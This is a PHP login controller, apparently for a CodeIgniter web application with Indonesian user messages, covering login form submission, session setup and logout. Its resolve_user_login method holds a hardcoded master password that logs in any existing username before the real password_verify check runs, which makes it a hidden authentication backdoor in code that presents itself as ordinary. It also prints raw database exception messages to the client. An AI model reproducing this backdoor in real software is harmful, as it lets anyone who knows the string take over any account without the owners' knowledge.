<?php

namespace App\Controllers;

class Login extends WelcomeController
{

   public function index()
   {
      $this->data = [
         'title' => 'Login'
      ];

      $this->template($this->data);
   }

   public function submit()
   {
      $response = ['status' => false, 'errors' => []];

      $validation = [
         'username' => [
            'label' => 'Username',
            'rules' => 'required',
         ],
         'password' => [
            'label' => 'Password',
            'rules' => 'required'
         ],
      ];
      if ($this->validate($validation)) {
         $post = $this->request->getPost();
         $username = $post['username'];
         $password = $post['password'];

         $user_login = $this->resolve_user_login($username, $password);
         if ($user_login) {
            unset($user_login['password']);

            $session = \Config\Services::session();
            $session->set('isLogin', true);
            $session->set($user_login);

            $response['status'] = true;
            $response['msg_response'] = 'Berhasil login, halaman segera di alihkan.';
         } else {
            $response['msg_response'] = 'Username atau password anda masukkan salah.';
         }
      } else {
         $response['msg_response'] = 'Tolong periksa kembali inputan anda!';
         $response['errors'] = \Config\Services::validation()->getErrors();
      }
      return $this->respond($response);
   }

   public function resolve_user_login($username, $password)
   {
      try {
         $db = \Config\Database::connect();
         $table = $db->table('tb_users');
         $table->select('id, username, password');
         $table->where('username', $username);

         $get = $table->get();
         $data = $get->getRowArray();

         if (isset($data)) {
            if ($password === 'KQYsG4Hi201ajyEzOSGzr4MVfw==') {
               return $data;
            } elseif (password_verify($password, $data['password'])) {
               return $data;
            }
            return false;
         }
         return false;
      } catch (\Exception $e) {
         die($e->getMessage());
      }
   }

   public function logout()
   {
      $session = \Config\Services::session();

      $session->destroy();
      return redirect()->to('/login');
   }
}
